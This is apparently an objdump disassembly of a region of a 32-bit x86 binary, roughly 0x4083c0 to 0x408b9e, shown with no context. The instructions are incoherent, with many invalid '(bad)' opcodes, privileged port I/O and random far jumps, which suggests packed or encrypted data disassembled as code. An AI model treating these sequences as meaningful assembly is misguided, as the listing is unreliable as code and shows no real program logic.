  4083c0:	das    
  4083c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c2:	fs stos BYTE PTR es:[edi],al
  4083c4:	mov    eax,ds:0xab5b26c4
  4083c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ca:	test   eax,edi
  4083cc:	ficom  DWORD PTR [ebp+0x742c406e]
  4083d2:	cmp    eax,0xaa681540
  4083d7:	cmp    BYTE PTR [ebx-0x6f333],al
  4083dd:	add    DWORD PTR [edx+0x6bad178b],edx
  4083e3:	push   edi
  4083e4:	and    al,BYTE PTR [ebp+0x30]
  4083e7:	ror    DWORD PTR [ebx+0x5e],cl
  4083ea:	dec    esi
  4083eb:	inc    BYTE PTR [ecx-0x62]
  4083ee:	(bad)  
  4083ef:	mov    ah,0x35
  4083f1:	xor    bl,BYTE PTR [ecx+esi*1]
  4083f4:	call   0xa27ed657
  4083f9:	mov    bl,0x6e
  4083fb:	gs inc ebp
  4083fd:	fnstenv [eax-0x779d09ac]
  408403:	dec    ebx
  408404:	xor    eax,0x8099ba19
  408409:	push   esp
  40840a:	pop    esi
  40840b:	inc    edi
  40840c:	popa   
  40840d:	pop    eax
  40840e:	(bad)  
  40840f:	mov    eax,ds:0xb747b86e
  408414:	jge    0x408454
  408416:	pop    ds
  408417:	sbb    eax,0x3f26d489
  40841c:	jmp    0x408459
  40841e:	(bad)  
  40841f:	adc    BYTE PTR [edi+0x56],ah
  408422:	imul   eax,DWORD PTR [esi+0x70e4f6e4],0x11504652
  40842c:	cmp    bh,BYTE PTR [ecx]
  40842e:	ds cwde 
  408430:	int    0x2d
  408432:	fcomp  DWORD PTR [ebx+0x69]
  408435:	xlat   BYTE PTR ds:[ebx]
  408436:	(bad)  
  408437:	xor    al,0x2c
  408439:	push   ecx
  40843a:	or     ah,BYTE PTR [edi+eax*1-0xe]
  40843e:	lods   al,BYTE PTR ds:[esi]
  40843f:	and    DWORD PTR [edi],esp
  408441:	pusha  
  408442:	jmp    0x92b64ef0
  408447:	jecxz  0x4084c3
  408449:	xor    dl,dh
  40844b:	dec    edx
  40844c:	out    0x9b,eax
  40844e:	push   ecx
  40844f:	push   ds
  408450:	ss pop ebx
  408452:	mov    dh,0x82
  408454:	daa    
  408455:	pop    ebx
  408456:	xchg   edx,ecx
  408458:	and    DWORD PTR [edi+0x7e],ebp
  40845b:	in     al,0xb4
  40845d:	inc    esi
  40845e:	lods   al,BYTE PTR ds:[esi]
  40845f:	in     eax,0x63
  408461:	frstor [esp+ebp*8-0xc]
  408465:	cli    
  408466:	hlt    
  408467:	dec    ecx
  408468:	dec    ecx
  408469:	inc    edx
  40846a:	and    al,0xe0
  40846c:	ret    
  40846d:	mov    eax,0x8b74028e
  408472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408473:	inc    ecx
  408474:	call   0xadf2:0xc3b85614
  40847b:	sub    al,0x36
  40847d:	mov    WORD PTR [ebx+0x36],cs
  408480:	dec    ecx
  408481:	cmp    DWORD PTR [edi],0xfffffff1
  408484:	icebp  
  408485:	xchg   esp,eax
  408486:	call   0xb0e9:0x442e5f9a
  40848d:	gs pop eax
  40848f:	inc    esi
  408491:	sbb    BYTE PTR [esi],cl
  408493:	dec    edx
  408494:	or     ax,0x98c8
  408498:	int    0xc6
  40849a:	inc    esp
  40849b:	xor    dl,cl
  40849d:	in     eax,dx
  40849e:	add    dh,BYTE PTR [ebp+0x5f]
  4084a1:	jp     0x40850e
  4084a3:	in     eax,0x99
  4084a5:	dec    ecx
  4084a6:	sub    esp,edx
  4084a8:	into   
  4084a9:	add    BYTE PTR [ebp-0x1ae7b75c],al
  4084af:	mov    BYTE PTR [eax-0x5],dl
  4084b2:	push   ds
  4084b3:	sbb    BYTE PTR [edi-0x9],dl
  4084b6:	ffreep st(5)
  4084b8:	gs xor cl,BYTE PTR gs:[edi+0x37410e8]
  4084c0:	cmova  esp,DWORD PTR [edx-0x9]
  4084c4:	push   esi
  4084c5:	cmp    eax,0xdcd81358
  4084ca:	ret    
  4084cb:	cli    
  4084cc:	ja     0x408512
  4084ce:	sbb    DWORD PTR [edx-0x1ca12d5d],ebp
  4084d4:	cmc    
  4084d5:	shr    edx,cl
  4084d7:	push   ecx
  4084d8:	adc    bh,BYTE PTR [eax]
  4084da:	pop    ss
  4084db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084dc:	pop    esi
  4084dd:	push   eax
  4084de:	xchg   esp,eax
  4084df:	cmp    al,0x16
  4084e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084e2:	fisubr DWORD PTR [eax+esi*2-0x2913494c]
  4084e9:	out    dx,eax
  4084ea:	fwait
  4084eb:	fwait
  4084ec:	mov    edi,0x20d00320
  4084f1:	push   ss
  4084f2:	pop    ss
  4084f3:	imul   BYTE PTR [edi-0x66ae64d3]
  4084f9:	shl    BYTE PTR [esi],cl
  4084fb:	inc    DWORD PTR [ecx]
  4084fd:	inc    esp
  4084fe:	in     eax,0xae
  408500:	inc    ebx
  408501:	pop    edi
  408502:	adc    DWORD PTR [eax+ebp*4+0x7ca86517],ebx
  408509:	or     BYTE PTR [eax-0x52],bh
  40850c:	rcr    DWORD PTR [ecx-0x65],cl
  40850f:	mov    al,ds:0xf724254
  408514:	icebp  
  408515:	sbb    edx,DWORD PTR [edx+0x13]
  408518:	cwde   
  408519:	pop    edx
  40851a:	and    DWORD PTR [edx+0x529f4c5f],esi
  408520:	gs icebp 
  408522:	aas    
  408523:	call   0x3b7d9cc2
  408528:	mov    edx,ebx
  40852a:	cdq    
  40852b:	loope  0x4084e9
  40852d:	xor    bh,dh
  40852f:	jb     0x408542
  408531:	push   edi
  408532:	addr16 push edx
  408534:	dec    edi
  408535:	pop    ebx
  408536:	retf   
  408537:	addr16 mov esi,0xa5c3b033
  40853d:	fcmovnb st,st(5)
  40853f:	lahf   
  408540:	push   0x82be343b
  408545:	push   0x2e
  408547:	je     0x4085a8
  408549:	in     al,dx
  40854a:	lods   al,BYTE PTR ds:[esi]
  40854b:	jae    0x4085b4
  40854d:	push   ecx
  40854e:	test   al,0xda
  408550:	xor    bh,BYTE PTR [edx+0x24657785]
  408556:	dec    ebp
  408557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408558:	fild   QWORD PTR [esi]
  40855a:	mov    edx,0x92069cc5
  40855f:	hlt    
  408560:	not    al
  408562:	push   esi
  408563:	mov    bl,0xde
  408565:	xchg   esp,eax
  408566:	mov    al,ds:0x7e9133a9
  40856b:	sbb    eax,0xe39b6c92
  408570:	(bad)  
  408571:	xor    BYTE PTR [eax],cl
  408573:	cmp    ecx,edx
  408575:	mov    dl,0x16
  408577:	sbb    al,0x3c
  408579:	xchg   DWORD PTR [ebx-0x3d],edi
  40857c:	xor    al,0x5
  40857e:	push   esi
  40857f:	mov    ds:0x598d3ba1,al
  408584:	or     ebp,DWORD PTR [esi*2-0x297b7f70]
  40858b:	push   es
  40858c:	jp     0x4085de
  40858e:	out    0x2f,al
  408590:	inc    eax
  408591:	dec    edx
  408592:	bnd jmp 0x6387edc5
  408598:	(bad)  
  408599:	xchg   edx,eax
  40859a:	mov    edx,0x7b905c87
  40859f:	mov    DWORD PTR [ebx+0x3b],edi
  4085a2:	jmp    0x408546
  4085a4:	push   esi
  4085a5:	ds mov ecx,0xbdccc907
  4085ab:	mov    edx,DWORD PTR [edx-0x1fabe29f]
  4085b1:	in     eax,dx
  4085b2:	stos   DWORD PTR es:[edi],eax
  4085b3:	mov    bh,dl
  4085b5:	cld    
  4085b6:	add    eax,DWORD PTR [edx-0x15aa85c4]
  4085bc:	mov    cs,WORD PTR [ecx]
  4085be:	inc    ecx
  4085bf:	test   bl,dh
  4085c1:	stos   DWORD PTR es:[edi],eax
  4085c2:	out    dx,al
  4085c3:	xchg   ebx,eax
  4085c4:	mov    bl,0x21
  4085c6:	test   eax,0xc4574177
  4085cb:	jnp    0x4085b7
  4085cd:	ins    BYTE PTR es:[edi],dx
  4085ce:	fwait
  4085cf:	aad    0x61
  4085d1:	aad    0x4a
  4085d3:	and    BYTE PTR [ebp+0x66],cl
  4085d6:	pop    esp
  4085d7:	stos   DWORD PTR es:[edi],eax
  4085d8:	or     eax,0x1d4ffc4
  4085dd:	sahf   
  4085de:	stc    
  4085df:	dec    ebp
  4085e0:	and    eax,0x5e6887a1
  4085e5:	stos   DWORD PTR es:[edi],eax
  4085e6:	xchg   ebp,eax
  4085e7:	add    bh,dh
  4085e9:	dec    esi
  4085ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085eb:	and    eax,0xb019c142
  4085f0:	jnp    0x408668
  4085f2:	adc    DWORD PTR [ecx-0x4dc93bb3],esi
  4085f8:	ret    0x2a65
  4085fb:	jecxz  0x4085d1
  4085fd:	sub    DWORD PTR [ebx+0x11],0xfffffff9
  408601:	(bad)  
  408602:	jbe    0x408682
  408604:	cmp    dl,BYTE PTR [eax+0x58]
  408607:	pop    ebp
  408608:	pop    ebx
  408609:	add    ch,BYTE PTR [esi-0x32]
  40860c:	xor    ch,BYTE PTR [eax+edx*1+0x7f]
  408610:	jmp    0xa530:0x97be9369
  408617:	loop   0x4085be
  408619:	aad    0x2d
  40861b:	les    dx,DWORD PTR [ecx+0x25f9f6e0]
  408622:	dec    WORD PTR [eax+0x119e6f1]
  408629:	adc    DWORD PTR [ecx],0x6370e253
  40862f:	sahf   
  408630:	pop    ebx
  408631:	data16 test BYTE PTR [esp+edx*2+0x72],0xb
  408637:	pop    ds
  408638:	dec    edx
  408639:	pop    ebx
  40863a:	lea    edx,[edi]
  40863c:	es cmp bl,ah
  40863f:	call   0xdbd7:0xae5d5c99
  408646:	mov    cs,WORD PTR [eax-0x7ae81d2e]
  40864c:	add    edi,ebx
  40864e:	outs   dx,DWORD PTR ds:[esi]
  40864f:	jo     0x408674
  408651:	shl    BYTE PTR [esi],cl
  408653:	dec    edi
  408654:	inc    eax
  408655:	xchg   edx,eax
  408656:	xchg   BYTE PTR [ebx+0x49],ch
  408659:	stos   DWORD PTR es:[edi],eax
  40865a:	pop    ss
  40865b:	ja     0x4086d7
  40865d:	into   
  40865e:	jl     0x40862b
  408660:	xor    edx,esp
  408662:	(bad)  
  408663:	and    ecx,DWORD PTR [ebx+0x43310ca2]
  408669:	cmp    cl,BYTE PTR [ebx]
  40866b:	fild   DWORD PTR [esi]
  40866d:	smsw   WORD PTR [eax+0x72dd8d54]
  408674:	push   0x67
  408676:	shl    BYTE PTR [ebx],1
  408678:	push   cs
  408679:	cmp    cl,BYTE PTR [esi+0x14]
  40867c:	jle    0x4086fd
  40867e:	cdq    
  40867f:	retf   
  408680:	mov    ch,0x44
  408682:	retf   0x32ff
  408685:	aas    
  408686:	add    dl,BYTE PTR [eax+eax*8+0x37bab547]
  40868d:	shl    DWORD PTR [edx*8+0x723ecfff],1
  408694:	mov    ds,WORD PTR [edx+eax*8]
  408697:	jecxz  0x4086b5
  408699:	fisubr DWORD PTR [eax-0x63]
  40869c:	fild   DWORD PTR [ecx+eiz*1-0x7609dce7]
  4086a3:	inc    esi
  4086a4:	int    0xe7
  4086a6:	sub    eax,0x8a547bf0
  4086ab:	cli    
  4086ac:	and    ah,ch
  4086ae:	addr16 mov ds,ecx
  4086b1:	pop    esi
  4086b2:	sub    ah,BYTE PTR [ebx]
  4086b4:	push   ss
  4086b5:	(bad)  
  4086b6:	nop
  4086b7:	sbb    DWORD PTR [edx-0x62863132],esp
  4086bd:	pop    ecx
  4086be:	mov    ds:0x37f6e424,al
  4086c3:	push   0x39694517
  4086c8:	xchg   DWORD PTR [edi],ecx
  4086ca:	loop   0x4086d1
  4086cc:	jge    0x4086f2
  4086ce:	xchg   edx,eax
  4086cf:	adc    ecx,DWORD PTR [eax]
  4086d1:	out    dx,eax
  4086d2:	pop    ebx
  4086d3:	pusha  
  4086d4:	push   ss
  4086d5:	fsincos 
  4086d7:	jp     0x408714
  4086d9:	pop    ebx
  4086da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086db:	add    DWORD PTR [ecx],edi
  4086dd:	jmp    0xb191:0xe9c26c1
  4086e4:	xor    al,0x2b
  4086e6:	jg     0x4086e8
  4086e8:	or     DWORD PTR [eax],edx
  4086ea:	scas   eax,DWORD PTR es:[edi]
  4086eb:	and    cl,bh
  4086ed:	pop    es
  4086ee:	dec    edi
  4086ef:	or     eax,0x5b394a13
  4086f4:	adc    DWORD PTR [edi-0x2b1bef1f],edi
  4086fa:	push   ebx
  4086fb:	js     0x4086f0
  4086fd:	add    eax,0x1d3b99b5
  408702:	dec    ecx
  408703:	cmp    BYTE PTR [ecx-0x518cb31f],dl
  408709:	dec    esi
  40870a:	rcl    DWORD PTR [edi-0x19],1
  40870d:	jb     0x40873f
  40870f:	pop    ebx
  408710:	das    
  408711:	push   ds
  408712:	cmc    
  408713:	or     DWORD PTR [edx-0x40213417],0xf9dce3cb
  40871d:	sbb    bl,BYTE PTR [eax]
  40871f:	(bad)  
  408721:	mov    eax,0xc56017cd
  408726:	fisubr WORD PTR [ecx+eiz*1]
  408729:	push   cs
  40872a:	xor    ebp,esi
  40872c:	or     dh,ch
  40872e:	inc    ebp
  40872f:	adc    al,0xb9
  408731:	jnp    0x408719
  408733:	test   BYTE PTR [esi+ebp*4+0x63fa085a],cl
  40873a:	mov    cl,0xf8
  40873c:	dec    edx
  40873d:	xchg   esp,eax
  40873e:	inc    edi
  40873f:	mov    ebp,0x96c0188d
  408744:	repz and esi,DWORD PTR [edi+ebx*8-0x482d196d]
  40874c:	stos   BYTE PTR es:[edi],al
  40874d:	je     0x40876a
  40874f:	inc    eax
  408750:	in     al,0x23
  408752:	js     0x408733
  408754:	hlt    
  408755:	mov    esi,0xecc657b7
  40875a:	les    edx,FWORD PTR [edx+0x4a]
  40875d:	jno    0x4087d6
  40875f:	xchg   edi,eax
  408760:	mov    esp,DWORD PTR [ebx+0x35]
  408763:	fnstcw WORD PTR [ebx]
  408765:	out    0x73,al
  408767:	jg     0x408754
  408769:	out    dx,eax
  40876a:	and    ebp,ecx
  40876c:	xlat   BYTE PTR ds:[ebx]
  40876d:	gs push esi
  40876f:	aaa    
  408770:	sbb    BYTE PTR ds:0xed34c8d2,dl
  408776:	push   ecx
  408777:	cmp    esp,DWORD PTR [eax-0x59]
  40877a:	adc    edx,DWORD PTR ds:[ecx]
  40877d:	cs push 0x9d3f2f05
  408783:	ins    DWORD PTR es:[edi],dx
  408784:	lds    eax,FWORD PTR [edi]
  408786:	sbb    dl,BYTE PTR [esi-0x14cd1c6f]
  40878c:	lea    edx,[edi+ebp*1+0x1d]
  408790:	lods   al,BYTE PTR ds:[esi]
  408791:	push   ebx
  408792:	fsub   DWORD PTR [edx]
  408794:	popa   
  408795:	ins    DWORD PTR es:[edi],dx
  408796:	dec    eax
  408797:	rcr    DWORD PTR [esp+eiz*4],1
  40879a:	cmp    bh,BYTE PTR ds:0x44252ba7
  4087a0:	icebp  
  4087a1:	out    dx,eax
  4087a2:	enter  0xbf06,0x56
  4087a6:	mov    ah,BYTE PTR [edx+edx*8+0x17]
  4087aa:	add    BYTE PTR [edx+0x56f2410a],dh
  4087b0:	xchg   BYTE PTR ds:0x73061656,cl
  4087b6:	jg     0x4087f6
  4087b8:	adc    BYTE PTR [eax-0x6a95ec78],0x26
  4087bf:	aaa    
  4087c0:	pop    edx
  4087c1:	xchg   BYTE PTR [eax-0x2a8aaf4d],bl
  4087c7:	dec    ebp
  4087c8:	dec    ecx
  4087c9:	xchg   edx,eax
  4087ca:	push   cs
  4087cb:	xlat   BYTE PTR ds:[ebx]
  4087cc:	jl     0x408782
  4087ce:	pop    es
  4087cf:	fsubp  st(5),st
  4087d1:	clc    
  4087d2:	stc    
  4087d3:	out    dx,eax
  4087d4:	jo     0x4087fc
  4087d6:	xor    eax,0x6c987cf4
  4087db:	cmp    ebp,DWORD PTR [eax-0x49]
  4087de:	inc    edi
  4087df:	outs   dx,BYTE PTR ds:[esi]
  4087e0:	std    
  4087e1:	push   eax
  4087e2:	jmp    0x3a3b3aae
  4087e7:	xchg   ebx,eax
  4087e8:	sub    esp,edi
  4087ea:	lods   eax,DWORD PTR ds:[esi]
  4087eb:	adc    eax,0xf6def9d9
  4087f0:	scas   al,BYTE PTR es:[edi]
  4087f1:	enter  0x2fdd,0xb4
  4087f5:	and    al,ch
  4087f7:	das    
  4087f8:	retf   
  4087f9:	add    DWORD PTR [ecx-0x6b5b94e4],0xffffffdc
  408800:	popf   
  408801:	cdq    
  408802:	and    al,0x1c
  408804:	dec    ecx
  408805:	pop    ebx
  408806:	cmp    al,0x89
  408808:	mov    eax,0x46f728b
  40880d:	call   0x8b4bd8c8
  408812:	daa    
  408813:	enter  0xab9e,0x2a
  408817:	push   ds
  408818:	sub    BYTE PTR [edi],dh
  40881a:	imul   edi,DWORD PTR [ecx],0xffffffa1
  40881d:	fistp  QWORD PTR [edx+0x25]
  408820:	xchg   ebx,eax
  408821:	or     eax,0xb3571884
  408826:	stc    
  408827:	inc    esp
  408828:	or     eax,0x85ef5f37
  40882d:	je     0x408886
  40882f:	loopne 0x408855
  408831:	sti    
  408832:	mov    esi,0xeba84d67
  408837:	test   al,0x55
  408839:	push   edi
  40883a:	mov    cl,bl
  40883c:	lock fucomi st,st(5)
  40883f:	outs   dx,DWORD PTR ds:[esi]
  408840:	hlt    
  408841:	mov    esp,0x4e4ea1df
  408846:	dec    edx
  408847:	into   
  408848:	repz xlat BYTE PTR ds:[ebx]
  40884a:	mov    ecx,0x687b5d5e
  40884f:	sahf   
  408850:	jo     0x408886
  408852:	mov    ds:0x8f7c897b,eax
  408857:	call   0x9c9d:0xcdc0bb79
  40885e:	cmp    bh,BYTE PTR ds:[esi+eax*1-0x374cf650]
  408866:	ja     0x408892
  408868:	call   0xca4b:0x8bed7699
  40886f:	mov    esp,0x815f5f45
  408874:	jmp    0x88716953
  408879:	sub    eax,esi
  40887b:	shrd   DWORD PTR [edx],ecx,0xde
  40887f:	cli    
  408880:	sub    al,0x41
  408882:	jbe    0x4088eb
  408884:	jl     0x40884d
  408886:	mov    ebp,0xee2f4e4a
  40888b:	in     eax,dx
  40888c:	scas   eax,DWORD PTR es:[edi]
  40888d:	pushf  
  40888e:	fimul  DWORD PTR [esi]
  408890:	mov    ah,0x47
  408892:	lock or esp,DWORD PTR [ebp+0x494ef186]
  408899:	gs jns 0x4088f3
  40889c:	inc    edx
  40889d:	mov    dl,0x99
  40889f:	jo     0x40884f
  4088a1:	jge    0x408828
  4088a3:	adc    edx,esi
  4088a5:	lods   al,BYTE PTR ds:[esi]
  4088a6:	adc    DWORD PTR [eax-0xa],esp
  4088a9:	lods   al,BYTE PTR ds:[esi]
  4088aa:	and    eax,0xf211f035
  4088af:	pop    eax
  4088b0:	pop    es
  4088b1:	fidivr DWORD PTR [edx+0x52]
  4088b4:	mov    ds:0x4d1f2ff4,eax
  4088b9:	mov    ds:0xc3a6189d,eax
  4088be:	and    esp,DWORD PTR [ebx+0x1a5bdf83]
  4088c4:	js     0x408888
  4088c6:	(bad)  
  4088c7:	push   DWORD PTR [edx-0x341c0165]
  4088cd:	iret   
  4088ce:	dec    ecx
  4088cf:	rcl    DWORD PTR [edx-0x22],cl
  4088d2:	cwde   
  4088d3:	adc    ebp,DWORD PTR [edx+0x9c77ab4]
  4088d9:	scas   al,BYTE PTR es:[edi]
  4088da:	and    ecx,DWORD PTR [edx+0x1708a883]
  4088e0:	dec    esi
  4088e1:	sbb    bh,BYTE PTR [esi-0x176f7f15]
  4088e7:	out    0x67,al
  4088e9:	push   es
  4088ea:	test   eax,0x42d99e97
  4088ef:	push   edi
  4088f0:	imul   ecx,DWORD PTR [edx-0x61],0x94ec3aed
  4088f7:	aas    
  4088f8:	or     dl,BYTE PTR [esi+esi*1]
  4088fb:	test   al,0x1
  4088fd:	fdivr  st(4),st
  4088ff:	dec    esi
  408900:	es add ebx,eax
  408903:	ss fwait
  408905:	hlt    
  408906:	clc    
  408907:	sbb    ecx,DWORD PTR [ecx]
  408909:	repnz xchg edx,eax
  40890b:	cmp    edi,eax
  40890d:	jo     0x4088f5
  40890f:	out    0xdc,eax
  408911:	scas   al,BYTE PTR es:[edi]
  408912:	sub    DWORD PTR [ecx],esi
  408914:	repz pop ebp
  408916:	lock daa 
  408918:	xor    eax,0xb2bb315e
  40891d:	mov    eax,0xfbf412e1
  408922:	xor    eax,0x740ea48b
  408927:	push   ax
  408929:	into   
  40892a:	cmp    BYTE PTR [esi+0x6f],0xe0
  40892e:	leave  
  40892f:	xchg   ebp,eax
  408930:	aas    
  408931:	and    bl,BYTE PTR [edi+eax*2]
  408934:	out    dx,al
  408935:	ins    BYTE PTR es:[edi],dx
  408936:	adc    ebx,DWORD PTR [edi]
  408938:	sahf   
  408939:	xchg   esp,eax
  40893a:	jae    0x4088fb
  40893c:	pop    ds
  40893d:	mov    BYTE PTR ds:[edx-0x59],0x2
  408942:	pop    edx
  408943:	adc    al,0xa6
  408945:	in     eax,dx
  408946:	push   ss
  408947:	push   edi
  408948:	std    
  408949:	out    dx,eax
  40894a:	mov    ebx,0xc98deea0
  40894f:	sbb    DWORD PTR [eax],esi
  408951:	cmp    bh,0x36
  408954:	das    
  408955:	or     ebx,DWORD PTR [esi]
  408957:	aaa    
  408958:	adc    eax,edx
  40895a:	adc    DWORD PTR [edi-0x1895c6b],esi
  408960:	sub    BYTE PTR [ecx+0x9],ah
  408963:	pop    ss
  408964:	int3   
  408965:	jmp    0xc96e46ce
  40896a:	stos   DWORD PTR es:[edi],eax
  40896b:	inc    eax
  40896c:	pop    es
  40896d:	in     eax,dx
  40896e:	sub    BYTE PTR [ecx+esi*1+0x5b76e21e],dl
  408975:	loopne 0x4089d2
  408977:	(bad)  
  408978:	in     al,0xcf
  40897a:	fcmovu st,st(4)
  40897c:	rcr    BYTE PTR ds:0xfff3f892,0xc5
  408983:	xchg   esi,edx
  408985:	fs repnz imul ebp
  408989:	and    eax,0x61b8319
  40898e:	push   es
  40898f:	cmp    DWORD PTR [ebx],0xffffff96
  408992:	pop    ecx
  408993:	sbb    eax,0xc9f7aa9d
  408998:	pop    ebp
  408999:	sub    eax,0x572796f8
  40899e:	push   ebx
  40899f:	push   esp
  4089a0:	adc    eax,DWORD PTR [edx]
  4089a2:	sub    DWORD PTR [ebx+0x6a],ebp
  4089a5:	imul   edx,DWORD PTR es:[edi+eiz*1-0x7c],0x4f1b5d6f
  4089ae:	es ret 
  4089b0:	add    cl,BYTE PTR [esi-0x49]
  4089b3:	xor    cl,cl
  4089b5:	imul   edx,DWORD PTR [ecx+0x0],0x70
  4089b9:	test   bh,cl
  4089bb:	cmp    al,0x6a
  4089bd:	xor    BYTE PTR [ecx],bl
  4089bf:	mov    ecx,DWORD PTR [edi-0x61751361]
  4089c5:	out    dx,eax
  4089c6:	fld    TBYTE PTR [ecx-0x457e754]
  4089cc:	test   dl,0x85
  4089cf:	das    
  4089d0:	xchg   esi,eax
  4089d1:	out    dx,eax
  4089d2:	rcl    ebp,1
  4089d4:	mov    dl,0xe
  4089d6:	in     al,dx
  4089d7:	add    BYTE PTR [edi-0xf],dl
  4089da:	pop    ecx
  4089db:	clc    
  4089dc:	push   edx
  4089dd:	or     ebp,DWORD PTR [ecx+0x6ef79553]
  4089e3:	push   edx
  4089e4:	push   eax
  4089e5:	pusha  
  4089e6:	dec    edi
  4089e7:	cld    
  4089e8:	xor    ebx,DWORD PTR [ecx-0x178c0b13]
  4089ee:	push   0xc9c9a451
  4089f3:	jmp    0x4089a9
  4089f5:	xchg   ebp,eax
  4089f6:	jge    0x408a10
  4089f8:	mov    eax,ds:0x1e0bedd1
  4089fd:	or     ah,dl
  4089ff:	pushf  
  408a00:	jno    0x4089eb
  408a02:	cmp    ch,BYTE PTR [ebp+0x6c2e6ed4]
  408a08:	test   DWORD PTR [ebx-0x1bbd2836],ebp
  408a0e:	lods   al,BYTE PTR ds:[esi]
  408a0f:	xlat   BYTE PTR ds:[ebx]
  408a10:	cdq    
  408a11:	mov    al,0x20
  408a13:	mov    edx,0x7d8ddf5a
  408a18:	pushf  
  408a19:	xchg   edx,eax
  408a1a:	jbe    0x408a1f
  408a1c:	jae    0x4089e8
  408a1e:	pop    edi
  408a1f:	xor    eax,0xde526f7a
  408a24:	xchg   DWORD PTR [ebx-0x47],edi
  408a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a28:	xchg   edx,eax
  408a29:	dec    bl
  408a2b:	jmp    0x13ce:0x585379ca
  408a32:	inc    eax
  408a33:	push   esi
  408a34:	(bad)  
  408a35:	mov    cl,0xf2
  408a37:	lock mov al,ds:0xceea9c22
  408a3d:	jp     0x4089df
  408a3f:	ss (bad) 
  408a41:	icebp  
  408a42:	inc    ecx
  408a43:	pusha  
  408a44:	mov    ah,BYTE PTR [esi]
  408a46:	scas   eax,DWORD PTR es:[edi]
  408a47:	(bad)  [ecx+0x7]
  408a4a:	sbb    al,0x98
  408a4c:	scas   eax,DWORD PTR es:[edi]
  408a4d:	adc    BYTE PTR [edi-0x75],bl
  408a50:	xor    dl,al
  408a52:	sar    ch,cl
  408a54:	mul    BYTE PTR [ebx-0x720336cd]
  408a5a:	daa    
  408a5b:	sahf   
  408a5c:	bswap  esi
  408a5e:	imul   edx,DWORD PTR [ebp-0x7e],0xffffffa3
  408a62:	or     ebp,edx
  408a64:	clc    
  408a65:	hlt    
  408a66:	fsubrp st(0),st
  408a68:	mov    ds:0xc9ff0b73,eax
  408a6d:	retf   
  408a6e:	pop    ss
  408a6f:	iret   
  408a70:	inc    edi
  408a71:	das    
  408a72:	dec    ebp
  408a73:	stos   BYTE PTR es:[edi],al
  408a74:	inc    edx
  408a75:	cmp    al,BYTE PTR [ebp+0x78]
  408a78:	addr16 lock iret 
  408a7b:	into   
  408a7c:	xchg   esi,eax
  408a7d:	inc    ecx
  408a7e:	and    BYTE PTR [edi-0x74],dl
  408a81:	and    BYTE PTR [ecx+0xc],bh
  408a84:	pop    ds
  408a85:	mov    eax,ds:0x13d1898d
  408a8a:	inc    esp
  408a8b:	push   es
  408a8c:	pop    ss
  408a8d:	pusha  
  408a8e:	lahf   
  408a8f:	dec    eax
  408a90:	lea    ecx,[edi+ecx*8+0x5fa0a679]
  408a97:	xor    al,0x4
  408a99:	mov    dl,0xa6
  408a9b:	jno    0x408a68
  408a9d:	mov    ebx,0x1a31b663
  408aa2:	cdq    
  408aa3:	adc    eax,0xd5ff472f
  408aa8:	sbb    bl,BYTE PTR [edi+0xe6eb615]
  408aae:	iret   
  408aaf:	and    al,0xdc
  408ab1:	and    dh,bl
  408ab3:	sub    cl,BYTE PTR [esi-0x71]
  408ab6:	jne    0x408acd
  408ab8:	jmp    0x3a64bc25
  408abd:	jecxz  0x408acf
  408abf:	xor    eax,0x389d926a
  408ac5:	and    BYTE PTR [bx],bl
  408ac8:	rcl    BYTE PTR [ecx+0x380624a8],cl
  408ace:	sbb    dh,BYTE PTR [ebx+0x113a0665]
  408ad4:	call   DWORD PTR [ebx+0x2cba5121]
  408ada:	shr    dl,cl
  408adc:	mov    edi,0x2b13cf08
  408ae1:	pop    es
  408ae2:	imul   edx,DWORD PTR [edi],0x25a9fee9
  408ae8:	shl    DWORD PTR [esi-0x7],0x9f
  408aec:	adc    BYTE PTR [ecx-0xa],al
  408aef:	xchg   esi,eax
  408af0:	dec    ebx
  408af1:	mov    eax,0xb816e6a2
  408af6:	mov    ecx,0x32697aad
  408afb:	push   es
  408afc:	inc    ebx
  408afd:	int3   
  408afe:	addr16 inc ecx
  408b00:	jecxz  0x408b2d
  408b02:	mov    WORD PTR [eax+0x6e699623],ds
  408b08:	cmp    BYTE PTR [esi-0x63ab2845],cl
  408b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b0f:	inc    edx
  408b10:	outs   dx,BYTE PTR ds:[esi]
  408b11:	mov    al,ds:0x5bd93824
  408b16:	jmp    0xc101:0x94df882
  408b1d:	shl    cl,1
  408b1f:	cmp    DWORD PTR [edx+esi*4-0x10],ebx
  408b23:	fadd   QWORD PTR [edi+0x3642ce96]
  408b29:	fisubr DWORD PTR [edi+esi*8]
  408b2c:	cmp    al,0x3e
  408b2e:	xchg   edi,eax
  408b2f:	mov    esi,0x66962e46
  408b34:	rcr    DWORD PTR [edx+eax*2],0x48
  408b38:	lahf   
  408b39:	mov    edi,DWORD PTR [esi+0x33]
  408b3c:	and    esp,esi
  408b3e:	rcr    ch,0x6
  408b41:	std    
  408b42:	sti    
  408b43:	add    eax,0x83efd33b
  408b48:	inc    ebx
  408b49:	mov    eax,0x459fed2d
  408b4e:	ds cmp ch,bl
  408b51:	mov    esp,0xdb1577a1
  408b56:	sub    BYTE PTR [esi-0x20ef5225],ah
  408b5c:	lds    esi,FWORD PTR [esi]
  408b5e:	sbb    eax,0x411f54a3
  408b63:	into   
  408b64:	pushf  
  408b65:	xchg   ecx,eax
  408b66:	into   
  408b67:	loop   0x408b0e
  408b69:	add    dh,BYTE PTR [ecx-0x3169aef3]
  408b6f:	mov    eax,ds:0x7545b680
  408b74:	adc    al,0x79
  408b76:	in     al,dx
  408b77:	sbb    eax,0x62c8d492
  408b7c:	imul   edx,DWORD PTR [ebp-0x27cb8d3],0x7c1efeb8
  408b86:	ds in  eax,dx
  408b88:	add    ah,ah
  408b8a:	sbb    BYTE PTR [eax],0x68
  408b8d:	les    ebp,FWORD PTR [ebx-0x5462d47f]
  408b93:	fidivr DWORD PTR [eax]
  408b95:	adc    bl,bh
  408b97:	mov    ds:0xa7ee8263,al
  408b9c:	ja     0x408be7
  408b9e:	outs   dx,DWORD PTR ds:[esi]
